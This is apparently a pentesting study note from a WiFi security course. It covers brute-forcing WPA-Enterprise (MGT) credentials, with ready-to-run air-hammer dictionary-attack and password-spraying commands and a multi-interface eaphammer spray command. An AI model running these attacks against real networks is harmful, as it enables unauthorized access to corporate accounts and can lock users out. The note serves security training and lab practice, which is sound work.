# Brute Forcing Passwords on MGT Networks
On MGT networks that use password authentication, we can try brute-forcing user accounts. You can use `air-hammer` for this. **NOTE:** You have to run `air-hammer` with python2 or it will break.
## Dictionary Attack
```bash
echo 'DOMAIN\username' > username.list
python2 ./air-hammer.py -i wlan3 -e $ESSID -p $DICTIONARY -u username.list
```
**NOTE**: you have to be careful with this because most enterprise networks are hooked up w/ [Active Directory](../../computers/windows/active-directory/active-directory.md), so brute forcing the same username may bet them locked out after 3, 5, or 7 attempts.
## Password Spraying
A list of users with the domain added is generated, and air-hammer is used to perform password spraying with a common password across multiple accounts.
```bash
echo '
DOMAIN\username1
DOMAIN\username2
DOMAIN\username3
' > usernames.list
python2 ./air-hammer.py -i wlan4 -e $ESSID -P 1234567890 -u usernames.list
```
Notice that we use `P` (capitalized) to give `air-hammer` a single password to try.
### With `eaphammer`:
You can also try this attack with `eaphammer` and multiple interfaces, which will make it faster.
```bash
./eaphammer --eap-spray --interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 --essid wifi-corp --password 12345678 --user-list ~/top-usernames-shortlist-contoso.txt | grep -aE 'FOUND ONE|Trying credentials'
```


> [!Resources]
> - [Wifi Challenge Academy](https://academy.wifichallenge.com/courses/take/certified-wifichallenge-professional-cwp/texts/57442980-introduction)
> - My [own notes](https://github.com/trshpuppy/obsidian-notes) linked throughout the text.